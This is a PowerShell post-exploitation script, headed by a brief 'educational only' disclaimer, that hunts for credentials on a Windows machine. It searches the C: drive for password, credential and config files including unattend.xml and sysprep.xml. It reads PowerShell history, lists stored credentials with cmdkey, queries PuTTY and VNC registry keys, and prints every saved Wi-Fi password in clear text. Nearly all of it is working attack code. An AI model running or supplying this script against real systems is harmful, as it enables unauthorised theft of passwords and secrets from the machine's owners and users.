# PowerShell Credential Hunter
# WARNING: For educational purposes only. Use only in authorized testing environments.

Write-Host "=== Credential Hunter Script ===" -ForegroundColor Cyan
Write-Host ""

# Search for interesting files
$interestingFiles = @(
    "*pass*",
    "*cred*",
    "*vnc*",
    "*config*",
    "*.txt",
    "*.xml",
    "*.ini",
    "*.conf",
    "unattend.xml",
    "sysprep.xml"
)

Write-Host "[+] Searching for interesting files..." -ForegroundColor Green

foreach ($pattern in $interestingFiles) {
    try {
        $files = Get-ChildItem -Path C:\ -Include $pattern -Recurse -ErrorAction SilentlyContinue -Force |
                 Select-Object -First 20
        
        if ($files) {
            Write-Host "`n[*] Files matching pattern: $pattern" -ForegroundColor Yellow
            $files | Select-Object FullName, LastWriteTime | Format-Table -AutoSize
        }
    } catch {
        # Silently continue
    }
}

# Check PowerShell history
Write-Host "`n[+] Checking PowerShell History" -ForegroundColor Green
$historyPath = (Get-PSReadlineOption).HistorySaveFile
if (Test-Path $historyPath) {
    Write-Host "[*] History file: $historyPath" -ForegroundColor Yellow
    Get-Content $historyPath | Select-Object -Last 20
}

# Check for stored credentials
Write-Host "`n[+] Checking for Stored Credentials" -ForegroundColor Green
cmdkey /list

# Check registry for credentials
Write-Host "`n[+] Checking Registry for Credentials" -ForegroundColor Green

$registryPaths = @(
    "HKCU:\Software\SimonTatham\PuTTY\Sessions",
    "HKCU:\Software\ORL\WinVNC3\Password"
)

foreach ($path in $registryPaths) {
    if (Test-Path $path) {
        Write-Host "[*] Found: $path" -ForegroundColor Yellow
        Get-ItemProperty $path -ErrorAction SilentlyContinue
    }
}

# Check for Wi-Fi passwords
Write-Host "`n[+] Extracting Wi-Fi Passwords" -ForegroundColor Green
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    ($_ -split ':')[1].Trim()
}

foreach ($profile in $profiles) {
    Write-Host "`n[*] Profile: $profile" -ForegroundColor Yellow
    netsh wlan show profile name="$profile" key=clear | Select-String "Key Content"
}

Write-Host "`n[+] Credential Hunt Complete" -ForegroundColor Cyan
